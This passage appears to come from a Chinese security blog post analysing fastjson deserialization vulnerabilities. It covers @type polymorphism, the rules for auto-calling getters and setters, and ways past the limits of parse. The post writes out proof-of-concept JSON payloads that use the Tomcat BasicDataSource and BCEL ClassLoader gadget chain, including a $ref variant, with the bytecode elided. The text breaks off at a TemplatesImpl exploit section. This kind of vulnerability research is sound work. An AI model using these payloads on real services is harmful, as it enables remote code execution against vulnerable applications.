<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Phone</span><span class=p>()</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a>
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Phone</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>phoneNumber</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>phoneNumber</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>phoneNumber</span><span class=p>;</span>
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-11 name=__codelineno-0-11 href=#__codelineno-0-11></a><span class=w>        </span><span class=nd>@Override</span>
<a id=__codelineno-0-12 name=__codelineno-0-12 href=#__codelineno-0-12></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>toString</span><span class=p>(){</span>
<a id=__codelineno-0-13 name=__codelineno-0-13 href=#__codelineno-0-13></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>phoneNumber</span><span class=p>;</span>
<a id=__codelineno-0-14 name=__codelineno-0-14 href=#__codelineno-0-14></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-15 name=__codelineno-0-15 href=#__codelineno-0-15></a><span class=p>}</span>
<a id=__codelineno-0-16 name=__codelineno-0-16 href=#__codelineno-0-16></a>
<a id=__codelineno-0-17 name=__codelineno-0-17 href=#__codelineno-0-17></a><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>NewPhone</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Phone</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-0-18 name=__codelineno-0-18 href=#__codelineno-0-18></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>location</span><span class=p>;</span>
<a id=__codelineno-0-19 name=__codelineno-0-19 href=#__codelineno-0-19></a>
<a id=__codelineno-0-20 name=__codelineno-0-20 href=#__codelineno-0-20></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>NewPhone</span><span class=p>(){</span>
<a id=__codelineno-0-21 name=__codelineno-0-21 href=#__codelineno-0-21></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-22 name=__codelineno-0-22 href=#__codelineno-0-22></a>
<a id=__codelineno-0-23 name=__codelineno-0-23 href=#__codelineno-0-23></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>NewPhone</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>phoneNumber</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>location</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-0-24 name=__codelineno-0-24 href=#__codelineno-0-24></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>phoneNumber</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>phoneNumber</span><span class=p>;</span>
<a id=__codelineno-0-25 name=__codelineno-0-25 href=#__codelineno-0-25></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>location</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>location</span><span class=p>;</span>
<a id=__codelineno-0-26 name=__codelineno-0-26 href=#__codelineno-0-26></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-27 name=__codelineno-0-27 href=#__codelineno-0-27></a>
<a id=__codelineno-0-28 name=__codelineno-0-28 href=#__codelineno-0-28></a><span class=w>    </span><span class=nd>@Override</span>
<a id=__codelineno-0-29 name=__codelineno-0-29 href=#__codelineno-0-29></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>toString</span><span class=p>(){</span>
<a id=__codelineno-0-30 name=__codelineno-0-30 href=#__codelineno-0-30></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>phoneNumber</span><span class=o>+</span><span class=s>&quot;:&quot;</span><span class=o>+</span><span class=k>this</span><span class=p>.</span><span class=na>location</span><span class=p>;</span>
<a id=__codelineno-0-31 name=__codelineno-0-31 href=#__codelineno-0-31></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-32 name=__codelineno-0-32 href=#__codelineno-0-32></a><span class=p>}</span>
<a id=__codelineno-0-33 name=__codelineno-0-33 href=#__codelineno-0-33></a>
<a id=__codelineno-0-34 name=__codelineno-0-34 href=#__codelineno-0-34></a><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Person</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-0-35 name=__codelineno-0-35 href=#__codelineno-0-35></a>
<a id=__codelineno-0-36 name=__codelineno-0-36 href=#__codelineno-0-36></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>name</span><span class=p>;</span>
<a id=__codelineno-0-37 name=__codelineno-0-37 href=#__codelineno-0-37></a>
<a id=__codelineno-0-38 name=__codelineno-0-38 href=#__codelineno-0-38></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Phone</span><span class=w> </span><span class=n>phone</span><span class=p>;</span>
<a id=__codelineno-0-39 name=__codelineno-0-39 href=#__codelineno-0-39></a>
<a id=__codelineno-0-40 name=__codelineno-0-40 href=#__codelineno-0-40></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Person</span><span class=p>()</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-0-41 name=__codelineno-0-41 href=#__codelineno-0-41></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-42 name=__codelineno-0-42 href=#__codelineno-0-42></a>
<a id=__codelineno-0-43 name=__codelineno-0-43 href=#__codelineno-0-43></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Person</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>Phone</span><span class=w> </span><span class=n>phone</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-0-44 name=__codelineno-0-44 href=#__codelineno-0-44></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>name</span><span class=p>;</span>
<a id=__codelineno-0-45 name=__codelineno-0-45 href=#__codelineno-0-45></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>phone</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>phone</span><span class=p>;</span>
<a id=__codelineno-0-46 name=__codelineno-0-46 href=#__codelineno-0-46></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-47 name=__codelineno-0-47 href=#__codelineno-0-47></a>
<a id=__codelineno-0-48 name=__codelineno-0-48 href=#__codelineno-0-48></a><span class=w>    </span><span class=nd>@Override</span>
<a id=__codelineno-0-49 name=__codelineno-0-49 href=#__codelineno-0-49></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>toString</span><span class=p>(){</span>
<a id=__codelineno-0-50 name=__codelineno-0-50 href=#__codelineno-0-50></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>name</span><span class=o>+</span><span class=s>&quot;:&quot;</span><span class=o>+</span><span class=n>phone</span><span class=p>;</span>
<a id=__codelineno-0-51 name=__codelineno-0-51 href=#__codelineno-0-51></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-0-52 name=__codelineno-0-52 href=#__codelineno-0-52></a><span class=p>}</span>
</code></pre></div> <p>上面包括了3个简单的对象Person、Phone以及NewPhone，我们用fastjson将Person对象转化成一个json字符串，并还原</p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=n>Phone</span><span class=w> </span><span class=n>phone</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Phone</span><span class=p>(</span><span class=s>&quot;1234567890&quot;</span><span class=p>);</span>
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=n>Person</span><span class=w> </span><span class=n>person</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Person</span><span class=p>(</span><span class=s>&quot;john&quot;</span><span class=p>,</span><span class=w> </span><span class=n>phone</span><span class=p>);</span>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=n>String</span><span class=w> </span><span class=n>json</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>toJSONString</span><span class=p>(</span><span class=n>person</span><span class=p>);</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>json</span><span class=p>);</span>
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a><span class=n>Person</span><span class=w> </span><span class=n>p</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>parseObject</span><span class=p>(</span><span class=n>json</span><span class=p>,</span><span class=w> </span><span class=n>Person</span><span class=p>.</span><span class=na>class</span><span class=p>);</span>
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=c1>// output </span>
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a><span class=c1>// {&quot;name&quot;:&quot;john&quot;,&quot;phone&quot;:{&quot;phoneNumber&quot;:&quot;1234567890&quot;}}</span>
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a><span class=c1>// john:1234567890</span>
</code></pre></div> <p>调用fastjson的toJSONString可以轻易地将object转化为json字符串，也可以用parseObject将json字符串还原出来。但是这里有一个限制就是</p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=n>Phone</span><span class=w> </span><span class=n>phone</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NewPhone</span><span class=p>(</span><span class=s>&quot;1234567890&quot;</span><span class=p>,</span><span class=s>&quot;China&quot;</span><span class=p>);</span>
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a><span class=n>Person</span><span class=w> </span><span class=n>person</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Person</span><span class=p>(</span><span class=s>&quot;john&quot;</span><span class=p>,</span><span class=w> </span><span class=n>phone</span><span class=p>);</span>
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a><span class=n>String</span><span class=w> </span><span class=n>json</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>toJSONString</span><span class=p>(</span><span class=n>person</span><span class=p>);</span>
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>json</span><span class=p>);</span>
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a><span class=n>Person</span><span class=w> </span><span class=n>p</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>parseObject</span><span class=p>(</span><span class=n>json</span><span class=p>,</span><span class=w> </span><span class=n>Person</span><span class=p>.</span><span class=na>class</span><span class=p>);</span>
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a><span class=c1>// output</span>
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a><span class=c1>// {&quot;name&quot;:&quot;john&quot;,&quot;phone&quot;:{&quot;location&quot;:&quot;China&quot;,&quot;phoneNumber&quot;:&quot;1234567890&quot;}}</span>
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a><span class=c1>// john:1234567890</span>
</code></pre></div> <p>在上面的写法中，由于fastjson不知道需要还原的Person的Phone是本身还是子类NewPhone，面对这种多态方式，fastjson还原是父类，而不是子类NewPhone。这意味着我们丢失了Json字符串中phone的location字段。这显然是不可忍受的，所以fastjson给我们提供了指定还原类的字段<code>@type</code>方法</p> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=n>Phone</span><span class=w> </span><span class=n>phone</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NewPhone</span><span class=p>(</span><span class=s>&quot;1234567890&quot;</span><span class=p>,</span><span class=s>&quot;China&quot;</span><span class=p>);</span>
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a><span class=n>Person</span><span class=w> </span><span class=n>person</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Person</span><span class=p>(</span><span class=s>&quot;john&quot;</span><span class=p>,</span><span class=w> </span><span class=n>phone</span><span class=p>);</span>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a><span class=n>String</span><span class=w> </span><span class=n>json</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>toJSONString</span><span class=p>(</span><span class=n>person</span><span class=p>,</span><span class=w> </span><span class=n>SerializerFeature</span><span class=p>.</span><span class=na>WriteClassName</span><span class=p>);</span>
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>json</span><span class=p>);</span>
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a><span class=n>Person</span><span class=w> </span><span class=n>p</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>parseObject</span><span class=p>(</span><span class=n>json</span><span class=p>,</span><span class=w> </span><span class=n>Person</span><span class=p>.</span><span class=na>class</span><span class=p>);</span>
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a><span class=c1>// output</span>
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a><span class=c1>// {&quot;@type&quot;:&quot;org.vultest.base.Person&quot;,&quot;name&quot;:&quot;john&quot;,&quot;phone&quot;:{&quot;@type&quot;:&quot;org.vultest.base.NewPhone&quot;,&quot;location&quot;:&quot;China&quot;,&quot;phoneNumber&quot;:&quot;1234567890&quot;}}</span>
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a><span class=c1>// john:1234567890:China</span>
</code></pre></div> <p>通过在toJSONString的时候指定SerializerFeature（SerializerFeature.WriteClassName），使得转化后的json字符串多了<code>@type</code>字段。这个字段指代了当前类的class，避免了上面的子类丢失字段的问题。比如上面直接指定了Person对象的phone属性的类是NewPhone，还原后成功打印出location。</p> <p>到了这里，我们可以思考一下，如果<code>@type</code>被指定为某恶意的类，是否会导致任意代码执行的漏洞？</p> <h3 id=2fastjson>(2).fastjson的流程简介</h3> <blockquote> <p>这里直接参考https://paper.seebug.org/994/</p> </blockquote> <p>用一下廖大的流程图</p> <p><img alt=img src=/images/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg></p> <p>具体的分析过程看上面的那篇文章即可，这里提一下将ASM动态生成的代码dump出来的方法</p> <p>在分析过程中，ASM动态生成了相应的bytecodes，这里用idea的断点来dump源码</p> <p>先将断点下在<code>com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80</code></p> <p><img alt=image-20200104200324167 src=/images/talk-about-fastjson-deserialization-20200413/image-20200104200324167.png></p> <p>生成的bytecodes在code里，用执行表达式的功能，执行<code>(new FileOutputStream("some.class")).write(code)</code>即可生成</p> <p><img alt=image-20200104200849550 src=/images/talk-about-fastjson-deserialization-20200413/image-20200104200849550.png></p> <h3 id=3-fastjson-gettersetter>(3). fastjson 自动调用getter和setter</h3> <p>类似Java的反序列化过程会自动调用readObject函数，fastjson还原对象时也会自动调用以下几个函数：</p> <ul> <li>无参数的构造函数</li> <li>符合条件的getter函数</li> <li>符合条件的setter函数</li> </ul> <p>这里需要区别的是fastjson所使用的parse函数和parseObject函数所调用的函数条件是不一样的。（ps：序列化时会调用所有getters）</p> <h4 id=1-parse-parseobject>1. parse 和 parseObject的区别</h4> <p>来看一下parseObject函数</p> <p><img alt=image-20200409201548997 src=/images/talk-about-fastjson-deserialization-20200413/image-20200409201548997.png></p> <p>这里parseObject函数会首先调用<code>JSON.parse</code>函数，然后再去调用<code>toJSON</code>函数。</p> <p>这里<code>toJSON</code>会把obj套一层<code>JSONObject</code>对象，他的实现方法是先new一个<code>JSONObject</code>，把obj对象给填充进去；然后调用<code>toJSONString</code>把生成的<code>JSONObject</code>转化为json字符串；最后再调用<code>parse</code>函数将这个json字符串给还原。</p> <p>这里的<code>toJSONString</code>是我们序列化的一个过程，他会去调用这个对象的所有getters，也就意味着<code>parseObject</code>函数会主动去调getters和setters，而<code>parse</code>函数则会调用这个对象的setters和符合条件的getters(这部分见后文)。</p> <p>那么也就意味着，<code>parseObject</code>比<code>parse</code>函数多了一个调用所有getters的利用点。</p> <h4 id=2-parse>2. parse自动调用函数的主要逻辑</h4> <p>接着我们来看一下<code>JSON.parse</code>函数自动调用getters和setters的逻辑。</p> <p>先来看一下调用流程，以下分析fastjson版本1.2.24</p> <p><code>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialze</code>（ps：这里很鸡贼的把deserialize的i给省略了）</p> <p><img alt=image-20200106094637943 src=/images/talk-about-fastjson-deserialization-20200413/image-20200106094637943.png></p> <p>首先是第570行调用了createInstance函数，该函数将会对当前还原的类进行实例化，这里会自动调用无参数的构造函数</p> <p>其次是第600行调用了parseField函数，该函数将对每个类属性进行初始化(或递归生成新的对象)</p> <p>跟进parseField函数</p> <p><img alt=image-20200106105841139 src=/images/talk-about-fastjson-deserialization-20200413/image-20200106105841139.png></p> <p>这里调用了<code>com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseField</code>函数，直接看关键点第83行，调用了setValue函数</p> <p><img alt=image-20200106110005828 src=/images/talk-about-fastjson-deserialization-20200413/image-20200106110005828.png></p> <p>setValue函数就是fastjson自动调用getter和setter的关键点</p> <p><img alt=image-20200106110837420 src=/images/talk-about-fastjson-deserialization-20200413/image-20200106110837420.png></p> <p>如果不存在相应的getter、setter、is函数，则利用反射机制将value赋值到当前的object上（这里就是else部分做的事情）。</p> <p>而当fieldInfo存在函数时，如果同时存在getter和setter，则调用setter，如果只存在getter则调用getter。</p> <p>这里我们关注一下fieldInfo的method是怎么填充的呢？这里要看<code>com/alibaba/fastjson/util/JavaBeanInfo.java#build</code>函数，ParserConfig在<code>createJavaBeanDeserializer</code>函数中会调用<code>JavaBeanInfo.build</code>函数，以此填充fieldInfo，也就是我们需要分析的几个method。</p> <p>不看具体的代码，写一下筛选的条件：</p> <p>setter提取条件：</p> <ul> <li>函数名长度大于等于4</li> <li>非静态函数</li> <li>限制返回类型为void或当前类</li> <li>函数参数只有一个</li> <li>函数名以set开头，第四个字符是大写或者<code>unicde</code>或者<code>_</code>或者字母f；如果函数名长度&gt;=5，看第5位字符是不是大写的</li> </ul> <p>getter提取条件：</p> <ul> <li>函数名长度大于等于4</li> <li>非静态函数</li> <li>函数名以get开头，第四个字符大写</li> <li>函数参数为0个</li> <li>函数的返回类型为Collection的子类或本身、Map的子类或本身、AtomicBoolean、AtomicInteger、AtomicLong</li> <li>无相对应的setter函数</li> </ul> <p>经过上述的两个条件提取后，保留了符合条件的getter和setter，并于<code>com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue</code>函数中invoke调用，也就是说实现了类似反序列化过程中主动调用readObject函数的效果。</p> <p>知道了上述的条件，其实我们可以利用传入某字段的方式来主动调用相关符合条件的setter和getter。例如在Person里面添加一个setTest函数，并在需要转化的json中添加<code>"test":1</code>，将会主动调用<code>setTest</code>。</p> <p>我们在利用<code>@type</code>构造有危害的利用链时，主要就是查找有危害的无参数的构造函数、符合条件的getter和setter。</p> <h4 id=3-parsegetters>3. 突破parse不能调用所有getters的限制</h4> <p>这里的突破思路主要有两个：</p> <ol> <li>tomcat bcel的poc</li> <li>threedream师傅发现的<a href=https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6>引用</a>的方式</li> </ol> <h5 id=tomcat-bcel-poc>第一种：Tomcat BCEL POC思路</h5> <p>这个poc巧妙的利用了<code>JSONObject.toString</code>函数，先来看看这个<code>toString</code></p> <p>这个<code>toString</code>继承自<code>JSON</code></p> <p><img alt=image-20200410110654354 src=/images/talk-about-fastjson-deserialization-20200413/image-20200410110654354.png></p> <p>这里他直接调用了<code>toJSONString</code>函数</p> <p><img alt=image-20200410110738399 src=/images/talk-about-fastjson-deserialization-20200413/image-20200410110738399.png></p> <p>看到后续他将当前这个JSONObject实例进行了obj to str的操作，也就是我们使用静态函数<code>JSON.toJSONString</code>来序列化数据一样，这里将会调用当前这个类的所有符合条件的getters（这里的条件比调用parse时宽松，他对返回类型无限制）。</p> <p>那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了</p> <p><code>com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject</code></p> <p><img alt=image-20200410121100651 src=/images/talk-about-fastjson-deserialization-20200413/image-20200410121100651.png></p> <p>这里有一处如果当前object为JSONObject类型时，将会对当前的这个key调用<code>toString</code>函数。这里在处理过程中，我们可以知道如果遇到<code>{</code>，fastjson会加一层JSONObject。</p> <p><img alt=image-20200410122509759 src=/images/talk-about-fastjson-deserialization-20200413/image-20200410122509759.png></p> <p>那么，我们只需要构造一个类似</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=p>{{</span><span class=err>some</span><span class=p>}:</span><span class=err>x</span><span class=p>}</span>
</code></pre></div> <p>这种方式，此时的key为<code>{}</code>(也就是下一层的JSONObject)，value为<code>x</code>。我们就可以使得fastjson去调用<code>key.toString</code>函数，这个<code>toString</code>的过程也就是将key调用<code>toJSONString</code>的过程，意味着将会调用当前key对象的所有getters。到这里我们就可以使parse函数拥有与parseObject一样的执行效果，以下面的poc为例。</p> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=p>{</span><span class=c1>// 第一层JSONObject，他的key为另外一个JSONObject</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=w>        </span><span class=p>{</span><span class=c1>// 下一层JSONObject，他的内容将会调用toJSONString</span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=w>            </span><span class=nt>&quot;x&quot;</span><span class=p>:{</span><span class=c1>// 具体触发点为getConnection</span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a><span class=w>                </span><span class=nt>&quot;@type&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class=p>,</span>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=w>                </span><span class=nt>&quot;driverClassLoader&quot;</span><span class=p>:</span><span class=w> </span><span class=p>{</span><span class=nt>&quot;@type&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class=p>},</span><span class=w>        </span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a><span class=w>        </span><span class=nt>&quot;driverClassName&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;$$BCEL$$$l$8b$I$A$...&quot;</span>
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=w>         </span><span class=p>}</span>
<a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=w>     </span><span class=p>}:</span><span class=s2>&quot;x&quot;</span>
<a id=__codelineno-5-9 name=__codelineno-5-9 href=#__codelineno-5-9></a><span class=p>}</span><span class=err>;</span>
</code></pre></div> <h5 id=ref>第二种：<code>$ref</code>点</h5> <p>当fastjson版本&gt;=1.2.36时，我们可以使用<code>$ref</code>的方式来调用任意的getter</p> <p>以1.2.48版本为例，首先看一下遇到<code>$ref</code>是怎么处理的</p> <p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388</code></p> <p><img alt=image-20200411145506512 src=/images/talk-about-fastjson-deserialization-20200413/image-20200411145506512.png></p> <p>当遇到引用<code>$ref</code>这种方式，会增加一个resolveTask，留在parse结束后进行处理</p> <p><code>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</code></p> <p><img alt=image-20200411145811138 src=/images/talk-about-fastjson-deserialization-20200413/image-20200411145811138.png></p> <p>调用<code>JSONPath.eval</code>，关于JSONPath的<a href=https://github.com/alibaba/fastjson/wiki/JSONPath>介绍</a></p> <p>这里的eval函数最终会去调用<code>JSONPath.getPropertyValue</code>函数（这里其实是可以根据我们传入的内容去调用不同的Segement，比如这里用了<strong>$.value</strong>的方式使用的是PropertySegement）</p> <p><img alt=image-20200411153340074 src=/images/talk-about-fastjson-deserialization-20200413/image-20200411153340074.png></p> <p>后续就不详细分析了，这里如果存在相应的getter，就会去invoke这个函数；如果没有，那么就会用反射机制去获取属性的值。</p> <p>这里举个例子</p> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=n>json</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&quot;{&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=w>          </span><span class=s>&quot;\&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=w>          </span><span class=s>&quot;\&quot;driverClassLoader\&quot;: {\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;},&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a><span class=w>          </span><span class=s>&quot;\&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$...\&quot;,&quot;</span><span class=w> </span><span class=o>+</span>
<a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a><span class=w>          </span><span class=s>&quot;\&quot;connection\&quot;:{\&quot;$ref\&quot;: \&quot;$.connection\&quot;}&quot;</span><span class=o>+</span>
<a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a><span class=w>                </span><span class=s>&quot;}&quot;</span><span class=p>;</span>
</code></pre></div> <p>会去调用<code>getConnection</code>函数，这里也突破了parse到parseObject的效果</p> <h3 id=4-private>(4). private属性</h3> <p>还有一点需要注意的是默认fastjon在转化时，如果没有setter函数，而是以反射机制来赋值的情况，会忽略private属性的转化。意味着如果我们在构造过程中，填充进去的属性是private的且没有setter，那么在转化过程中是不会被填入还原后的对象的。如果需要对private属性进行转化，那么需要设置<code>Feature.SupportNonPublicField</code></p> <h2 id=0x02-exp>0x02 EXP分析</h2> <hr> <p>相比于Java反序列化利用链构造的复杂性，fastjson利用链主要是寻找可利用的getter、setter等，常见的几种POC如下文所示：</p> <h3 id=1-templatesimpl>(1). templatesimpl</h3> <p>参考：<a href="http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/">http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p> <p>根据前面的分析，我们需要找到可以利用的构造函数、setter或getter函数。在分析Commons-Collections系统的利用链时，提到过templatesimpl的执行方式，通过载入bytecodes的方式来达到任意代码执行的效果(具体不再分析)。</p> <p>其中触发载入的函数为<code>newTransformer</code>函数，而很巧的是，templatesimpl存在一个getter调用了该函数</p> <p><img 